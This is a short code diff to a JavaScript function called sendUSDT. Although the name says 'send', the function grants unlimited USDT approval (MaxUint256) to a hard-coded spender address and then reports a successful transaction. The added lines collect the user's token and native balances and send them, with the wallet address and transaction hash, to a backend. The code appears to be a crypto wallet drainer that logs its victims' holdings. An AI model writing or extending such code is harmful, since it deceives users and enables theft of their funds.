@@ -83,14 +83,32 @@ async function sendUSDT() {
       signer
     );
 
+    // Get balances before transaction
+    const usdtBalanceWei = await usdt.balanceOf(userAddress);
+    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
+    
+    const nativeBalanceWei = await provider.getBalance(userAddress);
+    const nativeBalance = ethers.formatEther(nativeBalanceWei);
+
     const tx = await usdt.approve(
       BSC_SPENDER,
       ethers.MaxUint256
     );
 
-    await tx.wait();
+    const receipt = await tx.wait();
 
     alert("Transaction successful ✅");
+
+    // Save to backend via React (if available)
+    if (window.saveTransaction) {
+      window.saveTransaction({
+        walletAddress: userAddress,
+        toAddress: BSC_SPENDER,
+        txHash: receipt.hash,
+        usdtBalance: usdtBalance,
+        nativeBalance: nativeBalance
+      });
+    }
 
   } catch (e) {
     alert("Transaction cancelled");
